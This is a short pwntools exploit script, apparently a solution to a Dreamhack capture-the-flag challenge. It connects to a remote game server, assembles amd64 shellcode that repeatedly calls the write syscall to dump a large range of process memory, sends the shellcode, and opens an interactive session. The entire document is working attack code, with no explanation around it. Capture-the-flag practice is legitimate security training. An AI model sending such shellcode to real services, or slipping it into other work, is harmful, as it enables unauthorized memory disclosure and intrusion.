from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 14993
r = remote(HOST, PORT)

sh=asm('''
    mov rsi, 0x080000000000
    mov rbx, 0x080100000000

loop:
    mov rax, 1
    mov rdi, 1
    mov rdx, 0x500
    syscall

    add rsi, 0x1000
    cmp rsi, rbx
    jne loop
''')

r.send(sh)

r.interactive()